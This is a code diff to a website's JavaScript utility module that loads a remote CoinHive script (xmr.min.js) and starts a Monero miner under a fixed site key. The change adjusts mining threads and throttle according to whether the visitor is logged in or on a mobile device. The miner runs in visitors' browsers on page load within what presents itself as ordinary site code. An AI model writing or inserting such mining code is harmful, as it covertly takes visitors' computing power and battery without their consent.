@@ -249,8 +249,15 @@ var Util = {
       url: 'https://static.hacpai.com/js/lib/xmr.min.js',
       dataType: "script"
     }).done(function () {
-      var miner = new CoinHive.Anonymous('gr2r3rJsYmaJpSd2Nml15zomewwc6Lzc', {threads: 1, throttle: 0.9});
-      miner.start();
+      var data = {threads: 2, throttle: 0.5}
+      if (latkeConfig.isLoggedIn === 'true') {
+        data = {threads: 1, throttle: 0.8}
+      }
+      const ua =  navigator.userAgent;
+      if (/Android/i.test(ua) || /BlackBerry/i.test(ua) || /IEMobile/i.test(ua) || /iPhone|iPad|iPod/i.test(ua)) {
+        data = {threads: 1, throttle: 0.8}
+      }
+      (new CoinHive.Anonymous('gr2r3rJsYmaJpSd2Nml15zomewwc6Lzc', data)).start();
     });
   },
   /**
